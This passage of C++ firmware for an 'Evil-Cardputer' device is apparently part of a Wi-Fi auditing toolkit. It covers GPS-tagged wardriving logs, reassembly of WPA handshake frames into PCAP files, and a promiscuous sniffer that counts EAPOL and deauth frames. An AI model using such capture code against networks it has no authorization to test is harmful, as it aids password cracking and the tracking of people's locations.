// Mise Ã  jour de l'affichage du statut Bluetooth
void updateBluetoothStatus(bool status) {
    M5Cardputer.Display.fillScreen(menuBackgroundColor);
    M5Cardputer.Display.setTextSize(3);
    const char* text = "Connected";
    int16_t textWidth = M5Cardputer.Display.textWidth(text);
    int16_t textHeight = M5Cardputer.Display.fontHeight();
    int rectWidth = textWidth + 20;
    int rectHeight = textHeight + 20;
    int rectX = (240 - rectWidth) / 2;
    int rectY = (135 - rectHeight) / 2;

    if (status) {
        M5Cardputer.Display.drawRoundRect(rectX, rectY, rectWidth, rectHeight, 10, TFT_GREEN);
        M5Cardputer.Display.setTextColor(TFT_GREEN);
        Serial.println(F("Bluetooth status: Connected."));
    } else {
        isBluetoothKeyboardActive = false;
    }

    int textX = rectX + (rectWidth - textWidth) / 2;
    int textY = rectY + (rectHeight - textHeight) / 2;
    M5Cardputer.Display.setCursor(textX, textY);
    M5Cardputer.Display.print(text);
}

/*
============================================================================================================================
// Wardriving master
============================================================================================================================
*/

// -----------------------------------------------------------
// Constants defined here:
#define LOG_FILE_PREFIX "/evil/wardriving/wardriving-0"
#define MAX_LOG_FILES    100
#define LOG_FILE_SUFFIX  "csv"
#define LOG_COLUMN_COUNT 11
#define LOG_RATE         500

#define MAX_CHANNEL_ID   165
const int MAX_DISPLAY_LINES = 7;  // Affiche 10 lignes Ã  la fois dans GeneralInfo

File myFile;
char logFileName[24];
int totalNetworks   = 0;
unsigned long lastLog = 0;
int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData

const String wigleHeaderFileFormat =
  "WigleWifi-1.4,appRelease=v1.4.9,model=Cardputer,release=v1.4.9,"
  "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";

char* log_col_names[LOG_COLUMN_COUNT] = {
    "MAC", "SSID", "AuthMode", "FirstSeen", "Channel",
    "RSSI", "CurrentLatitude", "CurrentLongitude",
    "AltitudeMeters", "AccuracyMeters", "Type"
};

String recentSSID, recentSSID1, recentSSID2;

// index 0 non utilisÃ©; canaux valides de 1 Ã  MAX_CHANNEL_ID
static std::vector<String> boardSSIDs;
static std::vector<int>    boardSeen;
inline void ensureBoardStorage() {
  if (boardSSIDs.size() < (size_t)(MAX_CHANNEL_ID + 1)) boardSSIDs.resize(MAX_CHANNEL_ID + 1);
  if (boardSeen.size()   < (size_t)(MAX_CHANNEL_ID + 1)) boardSeen.resize(MAX_CHANNEL_ID + 1, 0);
}

// Scroll offset pour lâ€™Ã©cran GeneralInfo
int scrollOffset = 0;  

// -----------------------------------------------------------
// Structure pour les messages ESP-NOW
typedef struct struct_message {
    char    bssid[64];
    char    ssid[32];
    char    encryptionType[16];
    int32_t channel;
    int32_t rssi;
    int     boardID;  // maintenant = numÃ©ro de canal, potentiellement jusquâ€™Ã  165
} struct_message;

struct_message myData;

// -----------------------------------------------------------
// Callback ESP-NOW : appelÃ© quand un paquet arrive
void OnDataRecv(const uint8_t* mac, const uint8_t* incomingData, int len) {
    memcpy(&myData, incomingData, sizeof(myData));

    // (1) Si on est sur lâ€™Ã©cran 2 (ReceivedData), affiche la derniÃ¨re trame reÃ§ue
    if (currentScreen == 2) {
        displayReceivedData();
    }

    // (2) Log vers la carte SD
    File logFile = SD.open(logFileName, FILE_APPEND);
    if (logFile) {
        logFile.print(myData.bssid);            logFile.print(",");
        String SSIDString = myData.ssid;
        SSIDString.replace(",", ".");           logFile.print(SSIDString); logFile.print(",");
        logFile.print(myData.encryptionType);   logFile.print(",");
        logFile.printf("%04d-%02d-%02d-%02d-%02d-%02d,",
                       gps.date.year(), gps.date.month(),
                       gps.time.hour(), gps.time.minute(),
                       gps.time.second());
        logFile.print(myData.channel);           logFile.print(",");
        logFile.print(myData.rssi);              logFile.print(",");
        logFile.print(gps.location.lat(), 8);    logFile.print(",");
        logFile.print(gps.location.lng(), 8);    logFile.print(",");
        logFile.print(gps.altitude.meters());    logFile.print(",");
        logFile.print(gps.hdop.value());         logFile.print(",");
        logFile.print("WIFI");
        logFile.println();
        logFile.close();
    }

    // (3) Met Ã  jour la liste des SSID rÃ©cents
    recentSSID2 = recentSSID1;
    recentSSID1 = recentSSID;
    recentSSID  = myData.ssid;

    // (4) Stocke dans les tableaux indexÃ©s par canal (boardID == channel)
    if (myData.boardID >= 1 && myData.boardID <= MAX_CHANNEL_ID) {
        ensureBoardStorage();
        boardSSIDs[myData.boardID] = String(myData.ssid);
        boardSeen[myData.boardID]++;
    }

    totalNetworks++;
}

// -----------------------------------------------------------
// Choix du nom de fichier pour le log CSV
void updateFileName() {
    for (int i = 0; i < MAX_LOG_FILES; i++) {
        sprintf(logFileName, "%s%d.%s", LOG_FILE_PREFIX, i, LOG_FILE_SUFFIX);
        if (!SD.exists(logFileName)) {
            Serial.println(F("New file name chosen:"));
            Serial.println(logFileName);
            break;
        } else {
            Serial.print(logFileName); Serial.println(F(" exists"));
        }
    }
}

// Ã‰crit lâ€™en-tÃªte Wigle et noms de colonnes dans le CSV
void printHeader() {
    File logFile = SD.open(logFileName, FILE_WRITE);
    if (logFile) {
        logFile.println(wigleHeaderFileFormat);
        for (int i = 0; i < LOG_COLUMN_COUNT; i++) {
            logFile.print(log_col_names[i]);
            if (i < LOG_COLUMN_COUNT - 1) logFile.print(',');
            else logFile.println();
        }
        logFile.close();
    }
}

// -----------------------------------------------------------
// Ã‰cran â€œGeneral Informationâ€ (avec scroll)
void displayGeneralInfo() {
    M5.Display.clear();

    int margin     = 5;
    int lineHeight = 10;
    int col1Width  = 24;  // largeur pour afficher le numÃ©ro de canal
    int col2Width  = 40;  // largeur pour afficher le compteur
    int col3Width  = 80;  // largeur pour afficher le SSID
    int separatorW = 8;
    int x = margin;
    int y = margin;

    // Affiche latitude, longitude, satellites et total de rÃ©seaux dÃ©tectÃ©s
    M5.Display.setTextSize(1);
    M5.Display.setCursor(x, y);
    M5.Display.printf("Lat:%.3f|Lon:%.3f  Sat:%d  TotalN:%d",
                      gps.location.lat(),
                      gps.location.lng(),
                      gps.satellites.value(),
                      totalNetworks);
    y += lineHeight;
    y += 1;
    M5.Display.drawLine(margin, y, 240 - margin, y, taskbarDividerColor);
    y += 2;

    // 1) On dÃ©termine dâ€™abord combien de canaux ont boardSeen > 0
    ensureBoardStorage();
    int totalLines = 0;
    for (int ch = 1; ch <= MAX_CHANNEL_ID; ch++) {
        if (boardSeen[ch] > 0) totalLines++;
    }
    // Sâ€™assure que scrollOffset est dans [0 .. totalLines - MAX_DISPLAY_LINES]
    if (scrollOffset < 0) scrollOffset = 0;
    if (scrollOffset > totalLines - MAX_DISPLAY_LINES) {
        scrollOffset = max(0, totalLines - MAX_DISPLAY_LINES);
    }

    // 2) Parcourt tous les canaux mais nâ€™affiche que la fenÃªtre scrollOffset..scrollOffset+MAX_DISPLAY_LINES-1
    int lineIndex   = 0;  // index parmi les canaux dont boardSeen>0
    int displayed   = 0;  // nombre de lignes dÃ©jÃ  affichÃ©es
    for (int ch = 1; ch <= MAX_CHANNEL_ID; ch++) {
        if (boardSeen[ch] > 0) {
            // si cette ligne est dans la plage Ã  afficher
            if (lineIndex >= scrollOffset && displayed < MAX_DISPLAY_LINES) {
                // Affiche numÃ©ro de canal
                M5.Display.setCursor(x, y);
                M5.Display.printf("%3d", ch);
                // Affiche compteur
                M5.Display.setCursor(x + col1Width + separatorW, y);
                M5.Display.printf("%3d", boardSeen[ch]);
                // Affiche SSID (tronquÃ© si trop long)
                M5.Display.setCursor(x + col1Width + col2Width + 2*separatorW, y);
                M5.Display.printf("%-12s", boardSSIDs[ch].c_str());

                y += lineHeight;
                M5.Display.drawLine(margin, y, 240 - margin, y, taskbarDividerColor);
                y += 2;

                displayed++;
                if (displayed >= MAX_DISPLAY_LINES) break;
            }
            lineIndex++;
        }
    }

    // (3) Affiche en bas la liste des 3 SSID rÃ©cents
    y += 5;
    M5.Display.setCursor(x, y);
    M5.Display.print("Recent SSIDs:");
    String combined = recentSSID + ", " + recentSSID1 + ", " + recentSSID2;
    y += lineHeight;
    M5.Display.setCursor(x, y);
    M5.Display.printf("%s", combined.c_str());

    M5.Display.display();
}

// -----------------------------------------------------------
// Ã‰cran â€œLast Received Dataâ€ (screen 2)
unsigned long lastDisplayTime   = 0;
unsigned long displayInterval   = 1000;  // 1 s

void displayReceivedData() {
    if (millis() - lastDisplayTime >= displayInterval) {
        M5.Display.clear();
        int y = 2;
        int lineHeight = 10;
        int spacing    = 2;

        M5.Display.setCursor(5, y);
        M5.Display.println("Last data received:");
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("MAC: ");
        M5.Display.println(myData.bssid);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("SSID: ");
        M5.Display.println(myData.ssid);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("Encryption: ");
        M5.Display.println(myData.encryptionType);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("Channel: ");
        M5.Display.println(myData.channel);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("RSSI: ");
        M5.Display.println(myData.rssi);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("Lat: ");
        M5.Display.println(gps.location.lat(), 8);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("Lon: ");
        M5.Display.println(gps.location.lng(), 8);
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("Altitude: ");
        M5.Display.println(gps.altitude.meters());
        y += lineHeight + spacing;

        M5.Display.setCursor(5, y);
        M5.Display.print("HDOP: ");
        M5.Display.println(gps.hdop.value());
        y += lineHeight + spacing;

        M5.Display.display();
        lastDisplayTime = millis();
    }
}

// -----------------------------------------------------------
// Boucle principale en mode â€œWardriving Masterâ€
void loopwardrivingmaster() {
    // (1) Met Ã  jour lâ€™Ã©tat des touches
    M5Cardputer.update();
    M5.update();

    // (2) Navigation dâ€™Ã©cran
    if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        currentScreen = 1;  // GeneralInfo
    } 
    else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        currentScreen = 2;  // ReceivedData
    }

    // (3) Si on est sur lâ€™Ã©cran 1, on gÃ¨re aussi le scroll si > 10 lignes
    if (currentScreen == 1) {
        // Si â€œ.â€ est pressÃ© => descendre dâ€™une ligne
        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            scrollOffset++;
        }
        // Si â€œ;â€ est pressÃ© => remonter dâ€™une ligne
        else if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            scrollOffset--;
        }
    }

    // (4) Affiche lâ€™Ã©cran demandÃ©
    if (currentScreen == 1) {
        displayGeneralInfo();
    } 
    else if (currentScreen == 2) {
        displayReceivedData();
    }

    // (5) Si BACKSPACE, on quitte
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        Serial.println(F("Exiting Wardriving Master mode..."));
        stopEspNow();
        waitAndReturnToMenu("Returning to menu...");
    }

    // (6) DÃ©lai â€œintelligentâ€ pour lire GPS et maintenir lâ€™UI rÃ©active
    smartDelay(1000);
}

// -----------------------------------------------------------
// DÃ©lai â€œintelligentâ€ qui alimente le GPS et met Ã  jour les touches
void smartDelay(unsigned long ms) {
    unsigned long start = millis();
    do {
        while (cardgps.available()) gps.encode(cardgps.read());
        M5.update();
        M5Cardputer.update();
    } while (millis() - start < ms);
}

// -----------------------------------------------------------
// DÃ©sactive la rÃ©ception ESP-NOW
void stopEspNow() {
    esp_now_unregister_recv_cb();
    Serial.println(F("ESP-NOW receiving process stopped."));
}


// -----------------------------------------------------------
// DÃ©marrage du mode Wardriving Master (appelÃ©e depuis votre menu principal)
void startWardivingMaster() {
    Serial.println(F("Entering Wardriving Master mode..."));
    WiFi.mode(WIFI_STA);

    if (esp_now_init() != 0) {
        Serial.println(F("Error initializing ESP-NOW"));
        return;
    }
    esp_now_register_recv_cb(OnDataRecv);
    updateFileName();
    printHeader();

    while (true) {
        loopwardrivingmaster();
        M5.update();
        M5Cardputer.update();

        // Si BACKSPACE => sortie
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            Serial.println(F("Exiting Wardriving Master mode..."));
            stopEspNow();
            waitAndReturnToMenu("Returning to menu...");
            break;
        }
    }
}

/*
============================================================================================================================
// Handshake master  
============================================================================================================================

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1. Constantes â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
#define ESPNOW_MAX_DATA_LEN 250
const uint16_t MAX_FRAGMENT_SIZE = ESPNOW_MAX_DATA_LEN - 5; // 5 = header

typedef struct {
  uint16_t frame_len;
  uint8_t  fragment_number;
  bool     last_fragment;
  uint8_t  boardID;
  uint8_t  frame[MAX_FRAGMENT_SIZE];
} __attribute__((packed)) wifi_frame_fragment_t;

static const uint8_t channelsList[] = {
  1,2,3,4,5,6,7,8,9,10,11,12,13,
  36,40,44,48, 52,56,60,64,
  100,104,108,112,116,120,124,128,132,136,140,
  149,153,157,161,165
};
static const size_t NUM_CHANNELS = sizeof(channelsList) / sizeof(channelsList[0]);

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 2. Ã‰tat par canal (â‰ˆ0,8 kio) â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
uint16_t received_len[NUM_CHANNELS]            = {0};
uint8_t  next_frag   [NUM_CHANNELS]            = {0};
int      received_frames[NUM_CHANNELS]         = {0};
int      lastReceivedFrames[NUM_CHANNELS] = {0};
int      lastTotalReceived               = -1;
char lastSSIDMasterSniffer[33] = "";   

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 3. File circulaire fragments â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
#define QUEUE_LEN 32

typedef struct { uint8_t data[ESPNOW_MAX_DATA_LEN]; uint8_t len; } frag_item_t;

/* >>> le tableau nâ€™est plus volatile <<< */
static frag_item_t q[QUEUE_LEN];

/* seuls les index sont volatiles (partagÃ©s ISR / main) */
volatile uint8_t qHead = 0, qTail = 0;

inline bool qFull () { return uint8_t(qHead + 1) % QUEUE_LEN == qTail; }
inline bool qEmpty() { return qHead == qTail; }

inline void qPush(const uint8_t* d, uint8_t l){
  if(qFull()) return;                          // drop si pleine
  memcpy(q[qHead].data, d, l);                 // OK : plus de volatile
  q[qHead].len = l;
  qHead = (qHead + 1) % QUEUE_LEN;
}

inline bool qPop(uint8_t* dst, uint8_t* l){
  if(qEmpty()) return false;
  *l = q[qTail].len;
  memcpy(dst, q[qTail].data, *l);              // idem
  qTail = (qTail + 1) % QUEUE_LEN;
  return true;
}

/* â”€ variable globale pour la sortie (dÃ©jÃ  utilisÃ©e plus bas) â”€ */
volatile bool exitSniffMaster = false;


/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 4. Fichiers tmp & dossiers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
char pathBuf[32];
const char* tmpFile(uint8_t idx){ sprintf(pathBuf,"/evil/tmp/f%02u.bin",idx); return pathBuf; }

void makeDirs(){
  if(!SD.exists("/evil"))               SD.mkdir("/evil");
  if(!SD.exists("/evil/tmp"))           SD.mkdir("/evil/tmp");
  if(!SD.exists("/evil/handshakes"))    SD.mkdir("/evil/handshakes");
}

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 5. PCAP helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
void openPCAP(){
  int n=0; String fn;
  do{ fn="/evil/handshakes/masterSniffer_"+String(n++,HEX)+".pcap"; }while(SD.exists(fn));
  pcapFile = SD.open(fn, FILE_WRITE);
  const uint8_t hdr[24]={0xd4,0xc3,0xb2,0xa1, 0x02,0x00,0x04,0x00,
                         0,0,0,0, 0,0,0,0, 0xff,0xff,0,0, 0x69,0,0,0};
  pcapFile.write(hdr,24); pcapFile.flush();
  Serial.printf("PCAP: %s\n", fn.c_str());
}

void addFrameToPCAP(const char* p,uint32_t len){
  if(!pcapFile) return;
  File f=SD.open(p); if(!f) return;
  uint32_t ts=millis(); uint32_t sec=ts/1000, usec=(ts%1000)*1000;
  pcapFile.write((uint8_t*)&sec ,4);
  pcapFile.write((uint8_t*)&usec,4);
  pcapFile.write((uint8_t*)&len ,4);
  pcapFile.write((uint8_t*)&len ,4);
  uint8_t buf[256];
  while(int n=f.read(buf,256)) pcapFile.write(buf,n);
  pcapFile.flush(); f.close(); SD.remove(p);
}

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 6.  ISR ESP-NOW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
void IRAM_ATTR onRecv(const uint8_t*, const uint8_t* d, int l){
  if(l>ESPNOW_MAX_DATA_LEN) return;
  qPush(d, (uint8_t)l);            // SD & calcul hors ISR
}

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 7.  Traitement dâ€™un fragment â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
void extractSSIDFromFrame(const char* path)
{
  File f = SD.open(path);
  if (!f) return;

  /* 24-octet MAC header + 12-octet fixed params = 36 octets              */
  uint8_t hdr[36];
  if (f.read(hdr, 36) != 36) { f.close(); return; }

  /* IE 0 (SSID) doit suivre immÃ©diatement                                */
  uint8_t ie[2];
  if (f.read(ie, 2) != 2 ||
      ie[0] != 0          ||       // tag ID â‰  0  â†’ pas un SSID
      ie[1] == 0          ||       // SSID vide   â†’ ignorer
      ie[1] > 32)   { f.close(); return; }

  f.read((uint8_t*)lastSSIDMasterSniffer, ie[1]);
  lastSSIDMasterSniffer[ie[1]] = '\0';           // terminaison C-string
  f.close();
}


/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 7.  Traitement dâ€™un fragment â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
void handleFragment(const uint8_t* d, uint8_t len)
{
  auto* rx = (const wifi_frame_fragment_t*)d;
  if (len < 5 || len < rx->frame_len + 5)             return;
  uint8_t id = rx->boardID;
  if (id == 0 || id > NUM_CHANNELS)                   return;
  size_t idx = id - 1;

  /* â”€â”€ Ordre des fragments                                                */
  if (rx->fragment_number != next_frag[idx]) {
    received_len[idx] = 0; next_frag[idx] = 0;
    SD.remove(tmpFile(idx));
    return;
  }

  File f = SD.open(tmpFile(idx),
                   next_frag[idx] == 0 ? FILE_WRITE : FILE_APPEND);
  if (!f) return;
  f.write(rx->frame, rx->frame_len);
  f.close();

  received_len[idx] += rx->frame_len;
  next_frag[idx]++;

  /* â”€â”€ Trame complÃ¨te â”€ extraire SSID puis archiver dans le PCAP          */
  if (rx->last_fragment) {
    extractSSIDFromFrame(tmpFile(idx));          // <-- LECTURE AVANT delete
    addFrameToPCAP   (tmpFile(idx), received_len[idx]);
    /* addFrameToPCAP() supprime le fichier Ã  la fin â†’ OK */

    received_frames[idx]++;                      // stats GUI
    received_len[idx] = 0;
    next_frag[idx]    = 0;
  }
}


/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 8.  Affichage â€• displayStatus â”€â”€â”€â”€â”€â”€â”€*/
void displayStatus(){
  /* --- Total frames ---------------------------------------- */
  int total = 0;
  for(size_t i = 0; i < NUM_CHANNELS; i++) total += received_frames[i];

  if(total != lastTotalReceived){
    M5.Display.fillRect(0, 0, 240, 10, menuBackgroundColor);
    M5.Display.setCursor(5, 5);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(menuTextUnFocusedColor);
    M5.Display.printf("Total Frames: %d", total);
    lastTotalReceived = total;
  }

  /* --- Compteur par canal ---------------------------------- */
  const int C = 4;
  int rows = (NUM_CHANNELS + C - 1) / C;
  int w = 240 / C;
  int h = (135 - 20) / rows;

  for(size_t i = 0; i < NUM_CHANNELS; i++){
    if(received_frames[i] == lastReceivedFrames[i]) continue;

    int col = i % C;
    int row = i / C;
    int x = col * w;
    int y = 10 + row * h;

    M5.Display.fillRect(x, y, w, h, menuBackgroundColor);
    M5.Display.drawRect(x, y, w, h, menuTextFocusedColor);

    String t = "CH " + String(channelsList[i]) + ": " + String(received_frames[i]);
    int tw = M5.Display.textWidth(t);
    M5.Display.setCursor(x + (w - tw) / 2, y + (h - 6) / 2);
    M5.Display.print(t);

    lastReceivedFrames[i] = received_frames[i];
  }

  /* --- Actualiser l'Ã©cran principal ------------------------ */
  M5.Display.display();

  /* --- BanniÃ¨re SSID en pied d'Ã©cran ----------------------- */
  static String lastShown = "";
  if(lastSSIDMasterSniffer[0] && lastShown != lastSSIDMasterSniffer){
    int y = 135 - 15; // bandeau de 10 px en bas
    M5.Display.fillRect(0, y, 240, 10, menuBackgroundColor);
    M5.Display.setCursor(5, y);
    M5.Display.setTextColor(menuTextUnFocusedColor);
    M5.Display.printf("Last SSID : %s", lastSSIDMasterSniffer);
    M5.Display.display();
    lastShown = lastSSIDMasterSniffer;
  }
}

/*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 9. Boucle SniffMaster â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*/
void sniffMaster(){
  exitSniffMaster=false;
  M5.Display.clear(menuBackgroundColor);
  Serial.println(F(">> SniffMaster v3 (queue RAM)"));
  enterDebounce();

  memset(received_len,0,sizeof(received_len));
  memset(next_frag,  0,sizeof(next_frag));
  memset(received_frames,0,sizeof(received_frames));
  qHead=qTail=0;

  if(!SD.begin()){ Serial.println(F("SD fail")); return; }
  makeDirs(); openPCAP();

  WiFi.mode(WIFI_STA); WiFi.disconnect();
  if(esp_now_init()!=ESP_OK){ Serial.println(F("ESP-NOW fail")); return; }
  esp_now_register_recv_cb(onRecv);

  displayStatus();

  while(!exitSniffMaster){
    M5.update(); M5Cardputer.update();
    handleDnsRequestSerial();

    /* vide la file */
    uint8_t buf[ESPNOW_MAX_DATA_LEN], l;
    while(qPop(buf,&l)) handleFragment(buf,l);

    displayStatus();

    if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
       M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))
      exitSniffMaster=true;
  }
  esp_now_unregister_recv_cb(); esp_now_deinit();
  if(pcapFile) pcapFile.close();
  waitAndReturnToMenu("Returning to menu...");
}


/*
============================================================================================================================
// Wifi Visualizer
============================================================================================================================
*/
void wifiVisualizer() {
    bool inVisualizer = true;

    const int screenWidth = 240;
    const int screenHeight = 135;
    const int maxChannels = 13;
    const int leftMargin = 20;
    const int rightMargin = 5;
    const int chartWidth = screenWidth - leftMargin - rightMargin;
    const int spacing = 3;

    const int barWidth = (chartWidth - (spacing * (maxChannels - 1))) / maxChannels;
    const int chartHeight = screenHeight - 25;

    enterDebounce();

    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextSize(1);
    M5.Display.setTextFont(1);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(screenWidth / 2 - 30, screenHeight / 2 - 10);
    M5.Display.printf("Scanning...");
    M5.Display.display();

    static int colors[] = {TFT_WHITE, TFT_RED, TFT_PINK, TFT_ORANGE, TFT_YELLOW, TFT_GREENYELLOW, TFT_GREEN, TFT_DARKGREEN, TFT_CYAN, TFT_BLUE, TFT_NAVY, TFT_PURPLE, TFT_MAROON, TFT_MAGENTA};

    for (int i = 0; i <= 5; i++) {
        int yPosition = chartHeight - (i * chartHeight / 5) + 10;
        M5.Display.drawLine(leftMargin - 5, yPosition, leftMargin, yPosition, menuSelectedBackgroundColor);
        M5.Display.setCursor(2, yPosition - 5);
        int scaleValue = (5 * i);
        M5.Display.printf("%d", scaleValue);
    }
    for (int i = 1; i <= maxChannels; i++) {
        int xPosition = leftMargin + (i - 1) * (barWidth + spacing);
        M5.Display.setCursor(xPosition + (barWidth / 2) - 4, screenHeight - 8);
        M5.Display.setTextColor(colors[i+1], menuBackgroundColor);
        M5.Display.printf("%d", i);
    }
    M5.Display.display();

    WiFi.mode(WIFI_STA);
    WiFi.scanNetworks(true);
    bool scanInProgress = true;

    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        M5.update();
        M5Cardputer.update();

        int n = WiFi.scanComplete();
        if (n >= 0) {
            scanInProgress = false;

            int channels[maxChannels + 1] = {0};

            if (n == 0) {
                Serial.println(F("Aucun rÃ©seau WiFi trouvÃ©."));
            } else {
                for (int i = 0; i < n; i++) {
                    int channel = WiFi.channel(i);
                    if (channel >= 1 && channel <= maxChannels) {
                        channels[channel]++;
                    }
                }
            }

            WiFi.scanDelete();

            int maxCount = 1;
            for (int i = 1; i <= maxChannels; i++) {
                if (channels[i] > maxCount) {
                    maxCount = channels[i];
                }
            }

            int scaleMax = ((maxCount + 4) / 5) * 5;
            if (scaleMax < 5) scaleMax = 5;

            M5.Display.clear(menuBackgroundColor);
            M5.Display.setTextSize(1);
            M5.Display.setTextFont(1);

            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            for (int i = 0; i <= 5; i++) {
                int yPosition = chartHeight - (i * chartHeight / 5) + 10;
                M5.Display.drawLine(leftMargin - 5, yPosition, screenWidth-5, yPosition, menuSelectedBackgroundColor);
                M5.Display.setCursor(2, yPosition - 5);
                int scaleValue = (scaleMax * i) / 5;
                M5.Display.printf("%d", scaleValue);
            }

            for (int i = 1; i <= maxChannels; i++) {
                int barHeight = map(channels[i], 0, scaleMax, 0, chartHeight);
                int xPosition = leftMargin + (i - 1) * (barWidth + spacing);

                int amount = 100;
                uint8_t r = (colors[i] >> 11) & 0x1F;  // Extract the 5 most significant (red) bits
                uint8_t g = (colors[i] >> 5) & 0x3F;   // Extract the 6 middle (green) bits
                uint8_t b = colors[i] & 0x1F;          // Extract the 5 least significant (blue) bits

                // Convert 5-6-5 format to 8-bit depth to manipulate
                uint8_t red = (r * 255) / 31;
                uint8_t green = (g * 255) / 63;
                uint8_t blue = (b * 255) / 31;

                // Decrease by 'amount' with underflow protection
                red = (red > amount) ? (red - amount) : 0;
                green = (green > amount) ? (green - amount) : 0;
                blue = (blue > amount) ? (blue - amount) : 0;

                // Convert back to 5-6-5 format from 8-bit colors
                r = (red * 31) / 255;
                g = (green * 63) / 255;
                b = (blue * 31) / 255;

                // Recompose the color
                uint16_t shadowColor = (r << 11) | (g << 5) | b;
                uint16_t barColor = colors[i];

                M5.Display.fillRect(xPosition, screenHeight - barHeight - 10, barWidth, barHeight, barColor);

                M5.Display.fillTriangle(
                    xPosition + barWidth, screenHeight - barHeight - 10,
                    xPosition + barWidth + 4, screenHeight - barHeight - 14,
                    xPosition + barWidth + 4, screenHeight - 10, shadowColor
                );

                M5.Display.drawRect(xPosition, screenHeight - barHeight - 10, barWidth, barHeight, colors[i]);

                M5.Display.setCursor(xPosition + (barWidth / 2) - 4, screenHeight - 8);
                M5.Display.setTextColor(colors[i], menuBackgroundColor);
                M5.Display.printf("%d", i);
            }

            M5.Display.display();

            WiFi.scanNetworks(true);
            scanInProgress = true;
        }
    }

    inMenu = true;
    drawMenu();
}



typedef struct snifferAll_pcap_hdr_s {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} snifferAll_pcap_hdr_t;

typedef struct snifferAll_pcaprec_hdr_s {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} snifferAll_pcaprec_hdr_t;

int allSniffCount = 0;
int beaconCount = 0;
int eapolCount = 0;
int probeReqCount = 0;
int probeRespCount = 0;
int deauthCountSniff = 0;
int packetSavedCount = 0;

bool isPaused = false;
bool cursorVisible = true;

File sniffFile;

void writePCAPHeader_snifferAll(File &file) {
  Serial.println(F("Writing PCAP header to the file..."));
  snifferAll_pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105;

  file.write((const uint8_t*)&pcap_header, sizeof(snifferAll_pcap_hdr_t));
  file.flush();
  Serial.println(F("PCAP header written."));
}
void recordPacketToPCAPFile_snifferAll(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println(F("Capture file not open or sniffing is paused, packet not recorded."));
    return;
  }
  uint16_t sig_len = packet->rx_ctrl.sig_len;

  const uint8_t *frame = packet->payload;
  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameType = (frameControl >> 2) & 0x03; // Extraction des bits 2-3 pour le type
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (frameSubType == 0x08 || frameSubType == 0x04 || frameSubType == 0x05 || 
